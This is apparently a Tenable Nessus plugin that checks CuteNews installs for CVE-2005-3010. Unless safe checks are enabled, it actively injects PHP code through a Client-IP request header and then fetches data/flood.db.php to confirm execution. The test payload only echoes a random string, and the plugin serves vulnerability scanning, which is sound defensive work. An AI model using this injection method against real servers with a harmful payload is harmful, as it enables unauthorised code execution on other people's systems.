#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web site contains a PHP script that allows for arbitrary
PHP code execution. 

Description : 

The version of CuteNews installed on the remote host fails to properly
sanitize the IP addresses of clients using the system before logging
them to a known file.  An attacker can exploit this flaw to inject
arbitrary PHP code through a Client-IP request header and then execute
that code by requesting 'data/flood.db.php'. 

See also : 

http://retrogod.altervista.org/cutenews140.html

Solution : 

Restrict access to CuteNews' data directory; eg, using a .htaccess
file. 

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19756);
  script_version ("$Revision: 1.9 $");

  script_cve_id("CVE-2005-3010");
  script_bugtraq_id(14869);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"19478");
  }

  name["english"] = "CuteNews Client-IP Header Code Injection Vulnerability";
  script_name(english:name["english"]);

  script_description(english:desc["english"]);

  summary["english"] = "Checks for Client-IP header code injection vulnerability in CuteNews";
  script_summary(english:summary["english"]);

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_require_ports("Services/www", 80);
  script_dependencies("cutenews_detect.nasl");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/cutenews"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Try to exploit the flaw if safe checks are not enabled.
  #
  # nb: this won't work if CuteNews doesn't allow comments
  #     for the article id we pick.
  if (!safe_checks()) {
    # Get the main page where articles are listed
    #
    # nb: example{1,2}.php are default examples.
    req = http_get(item:string(dir, "/example2.php"), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # Identify an article id.
    pat = "subaction=showcomments&amp;id=([^&]+)&";
    matches = egrep(pattern:pat, string:res);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        id = eregmatch(pattern:pat, string:match);
        if (!isnull(id)) {
          id = id[1];
          break;
        }
      }
    }

    # If we have a thread id...
    if (!isnull(id)) {
      # Define a message to be echoed back to us.
      msg = rand_str(length:20);

      # First we need to inject some code by posting a comment.
      #
      # nb: this _will_ show up in the news script!
      postdata = string(
        "name=Nessus&",
        "mail=&",
        "comments=", urlencode(str:string("Test from ", SCRIPT_NAME)), "&",
        "subaction=addcomment"
      );
      req = string(
        "POST ", 
          dir, "/example2.php?",
          "subaction=showcomments&",
          "id=", id, "&",
          "archive=&",
          "start_from=&",
          "ucat=1&",
          "script=", SCRIPT_NAME,
          " HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "Client-Ip: <?php echo '", msg, "'; ?>\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # Now check for the exploit.
      req = http_get(item:string(dir, "/data/flood.db.php"), port:port);
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if our message was echoed back to us.
      if (msg >< res) {
        security_hole(port);
        exit(0);
      }
    }
    else {
      if (log_verbosity > 1) debug_print("couldn't find an article id to use!", level:0);
    }
  }

  # Check the version number in case safe checks were enabled or
  # comments for the selected article were not allowed.
  #
  # nb: 1.4.0 and below are affected.
  if (ver =~ "^(0.*|1\.([0-3].*|4\.0($|[^0-9])))") {
    desc = str_replace(
      string:desc["english"],
      find:"See also :",
      replace:string(
        "***** Nessus has determined the vulnerability exists on the remote\n",
        "***** host simply by looking at the version number of CuteNews\n",
        "***** installed there.\n",
        "\n",
        "See also :"
      )
    );
    security_hole(port:port, data:desc);
    exit(0);
  }
}
